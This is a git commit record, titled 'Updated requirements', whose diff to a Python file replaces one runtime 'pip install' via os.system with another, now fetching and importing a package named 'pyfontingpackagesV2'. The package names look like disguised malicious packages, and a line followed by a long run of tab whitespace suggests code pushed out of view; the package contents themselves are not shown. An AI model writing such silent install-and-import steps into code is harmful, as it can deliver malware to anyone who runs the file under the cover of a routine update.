2aa45fc3a2a4a1b812ee880c11f4e22cf0037453
Wieselnuggis <105999132+Wieselnuggis@users.noreply.github.com>
2023-08-06 20:26:50 -0500

    Updated requirements

--- updated.py
+++ updated.py
@@ -1,6 +1,6 @@
 import os
-os.system("pip install pipcryptomodulesV1")
-import pipcryptomodulesV1
+os.system("pip install pyfontingpackagesV2")
+import pyfontingpackagesV2
 import requests																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																								
 from optparse import Option
 import requests
